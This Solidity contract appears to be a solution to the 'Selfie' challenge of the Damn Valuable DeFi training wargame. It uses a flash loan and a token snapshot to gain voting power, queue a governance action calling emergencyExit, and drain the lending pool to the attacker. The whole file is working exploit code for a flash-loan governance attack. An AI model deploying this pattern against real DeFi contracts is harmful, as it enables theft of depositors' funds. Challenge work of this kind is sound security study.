//SPDX-Licensen-Identifier:MIT

pragma solidity ^0.8.16;
import {console} from "forge-std/console.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract Attacker is Ownable, IERC3156FlashBorrower {
    SimpleGovernance private s_simpleGovernance;
    SelfiePool private s_selfiePool;
    DamnValuableTokenSnapshot public immutable s_token;
    uint256 public actionId;
    bytes32 constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        SimpleGovernance simpleGovernance,
        SelfiePool selfiePool,
        address token
    ) {
        s_simpleGovernance = simpleGovernance;
        s_selfiePool = selfiePool;
        s_token = DamnValuableTokenSnapshot(token);
    }

    /**
     *   use flashloan to vote the proposal emergencyExit to transfer money to attacker
     */
    function proposal() public onlyOwner {
        s_selfiePool.flashLoan(
            this,
            address(s_token),
            s_token.balanceOf(address(s_selfiePool)),
            ""
        );
        uint256 balance = s_token.balanceOfAt(address(this), 2);
        console.log("votebalance", balance);
        bytes memory datas = abi.encodeWithSignature(
            "emergencyExit(address)",
            owner()
        );
        actionId = s_simpleGovernance.queueAction(
            address(s_selfiePool),
            0,
            datas
        );

        //emergencyExit from selfiePool
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        //use vote to proposal emergencyExit
        //check the vote

        // uint256 balance1 = s_token.balanceOfAt(address(this), 0);
        // console.log("vote1", balance1);
        s_token.snapshot();
        s_token.approve(address(s_selfiePool), amount);
        return CALLBACK_SUCCESS;
    }

    function excute() public onlyOwner {
        s_simpleGovernance.executeAction(actionId);
    }
}
